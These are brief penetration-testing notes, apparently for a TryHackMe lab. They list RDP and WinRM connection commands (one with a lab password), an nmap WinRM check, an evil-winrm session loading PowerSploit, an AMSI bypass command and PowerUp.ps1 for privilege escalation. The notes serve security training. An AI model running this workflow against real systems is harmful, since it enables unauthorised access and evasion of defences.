# Xfreerdp
```bash
xfreerdp /u:Administrator /p:'tryhackme123!' /w:1920 /h:1080 /v:10.10.255.247
```

# Winrm
```bash
# Checking for availability
cd ~/Scripts/nmap_scripts/My-NSE-Scripts/scripts
sudo nmap -sS -A -p 5985 TARGET_IP --script=winrm.nse

# Connect
ruby /home/vagrant/Scripts/evil-winrm/evil-winrm.rb -i TARGET_IP -u USER -p PASSWORD -s /home/vagrant/Scripts/PowerSploit/Privesc/

# Bypass protection
Bypass-4MSI

# Load tools
PowerUp.ps1

# Analysis

```

